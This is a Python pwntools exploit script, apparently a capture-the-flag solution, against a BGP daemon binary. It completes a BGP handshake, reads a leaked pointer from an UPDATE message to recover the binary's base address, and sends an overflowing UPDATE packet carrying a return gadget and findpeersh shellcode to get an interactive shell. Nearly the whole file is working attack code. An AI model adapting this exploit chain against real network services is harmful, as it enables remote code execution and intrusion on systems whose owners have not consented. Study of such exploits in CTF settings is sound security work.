#!/usr/bin/env python2
from pwn import *

context(arch = 'i386', os = 'linux')

# Demo should work even without a remote host
if 'HOST' in args:
    r = remote(args['HOST'], int(args['PORT']))
else:
    l = listen(0)
    l.spawn_process(['./bbgp_7cdbfdae936b3c6ed10588119a8279a0'])
    r = remote('localhost', l.lport)

p16b = make_packer  (16, 'big', 'unsigned')
u16b = make_unpacker(16, 'big', 'unsigned')

BGP_OPEN         = 1
BGP_UPDATE       = 2
BGP_NOTIFICATION = 3
BGP_KEEPALIVE    = 4

def send_pkt(cmd, payload):
    """Send a BGP packet"""
    r.send(flat(
        "\xff" * 16,
        p16b(len(payload) + 19),
        cmd,
        payload,
        word_size = 8
    ))

def recv_packet(cmd_type):
    """Receive a BGP packet of type cmd_type"""

    r.recvn(16)
    length = u16b(r.recvn(2))
    cmd = r.recvn(1)
    assert cmd == p8(cmd_type)
    return r.recvn(length-19)

def do_handshake(holdtime):
    """Does a handshake with the binary"""
    optparam = "\x02\x06\x01\x04\x00\x01\x00\x01"
    send_pkt(BGP_OPEN, flat(
        4,
        "AA",
        p16b(holdtime),
        "AAAA",
        len(optparam),
        optparam,
        word_size = 8,
    ))

    # Receive the two packages from the handshake
    recv_packet(BGP_OPEN)
    recv_packet(BGP_KEEPALIVE)

def announce_leak():
    # They have a bug in their update.
    # They send a pointer to an ip address in string-format
    # instead of the converted u32
    ip_addr = 0x4068
    msg = recv_packet(BGP_UPDATE)
    return u32(msg[-4:]) - ip_addr

def do_update_overflow(base):
    # Bug in their handling of updates.
    # TBH I don't remember how it works
    return_gadget = p32(base + 0x189D)

    widthdrawn_size = p16b(0)
    path_size       = p16b(23)
    flag1           = 0
    flag2           = 4
    n               = 20
    data            = asm('jmp $ + 20').ljust(16) + return_gadget
    code            = asm(shellcraft.findpeersh())
    send_pkt(2, flat(
        widthdrawn_size,
        path_size,
        flag1,
        flag2,
        n,
        data,
        code,
        word_size = 8
    ))

do_handshake(9)
base = announce_leak()
do_update_overflow(base)

# There is an alarm, please make it go away
r.sendline("bash")
r.clean()

# WIN!
r.interactive()
